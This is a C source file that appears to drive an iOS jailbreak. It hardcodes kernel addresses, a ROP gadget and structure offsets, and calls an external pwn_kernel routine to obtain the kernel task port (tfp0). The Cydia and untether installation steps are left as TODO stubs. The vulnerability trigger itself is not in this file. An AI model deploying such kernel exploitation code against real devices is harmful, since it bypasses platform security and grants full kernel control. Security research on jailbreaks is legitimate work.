#include <stdbool.h>
#include <stdint.h>
#include <mach/mach.h>

#include "common.h"
#include "infoleak.h"
#include "pwn.h"
#include "utils.h"

#include "jailbreak.h"

int jailbreak(uint32_t opt)
{
    static offsets_t offs = (offsets_t){
        #ifdef __LP64__
        .constant = {
            .kernel_image_base = 0xfffffff007004000,
        },
        .funcs = {
            .copyin = 0xfffffff00719e88c,
            .copyout = 0xfffffff00719eab0,
            .current_task = 0xfffffff0070e8c0c,
            .host_priv_self = 0xfffffff0070c292c,
            .get_bsdtask_info = 0xfffffff0070fe7ec,
            .vm_map_wire_external = 0xfffffff007148fe8,
            .ipc_port_alloc_special = 0xfffffff0070ad1a8,
            .ipc_kobject_set = 0xfffffff0070c3148,
            .ipc_port_make_send = 0xfffffff0070ac924,
        },
        .gadgets = {
            .add_x0_x0_ret = 0xfffffff0063fddbc,
        },
        .data = {
            .kernel_task = 0xfffffff0075d1048,
            .zone_map = 0xfffffff0075f3e50,
        },
        .vtabs = {
            .iosurface_root_userclient = 0xfffffff006e73590,
        },
        .struct_offsets = {
            .is_task_offset = 0x28,
            .task_itk_self = 0xd8,
            .itk_registered = 0x2f0,
            .ipr_size = 0x8, // should just be sizeof(kptr_t) ? 
            .sizeof_task = 0x5c8,
        },
        .iosurface = {
            .create_outsize = 0xbc8,
            .create_surface = 0,
            .set_value = 9,
        },
        #endif
    };

    int retval = -1;
    kern_return_t ret = 0;
    task_t self = mach_task_self(),
           tfp0 = MACH_PORT_NULL;
    kptr_t kbase = 0;
    if(opt & JBOPT_POST_ONLY)
    {
        ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &tfp0);
        ASSERT_RET_PORT(out, "tfp0", ret, tfp0);
        task_dyld_info_data_t info;
        mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
        ASSERT_RET(out, "task_info", task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&info, &cnt));
        kbase = info.all_image_info_addr;
    }
    else
    {
        suspend_all_threads();

        ret = pwn_kernel(offs, &tfp0, &kbase);

        resume_all_threads();
            
        if(ret != KERN_SUCCESS) goto out;
    }

    if (!MACH_PORT_VALID(tfp0))
    {
        LOG("invalid kernel task");
        goto out;
    }

    // TODO: do shit with tfp0 here?
    LOG("got tfp0: %x\n", tfp0);

    if(opt & JBOPT_INSTALL_CYDIA)
    {
        // TODO
        if(opt & JBOPT_INSTALL_UNTETHER)
        {
            // TODO: Install untether & register it with dpkg
        }
    }
    else if(opt & JBOPT_INSTALL_UNTETHER)
    {
        // TODO: Install untether without any kind of bootstrap
    }

    // TODO: or do shit with tfp0 here?

    retval = 0;
out:;
    if(MACH_PORT_VALID(tfp0))
    {
        mach_port_deallocate(self, tfp0);
    }
    return retval;
}
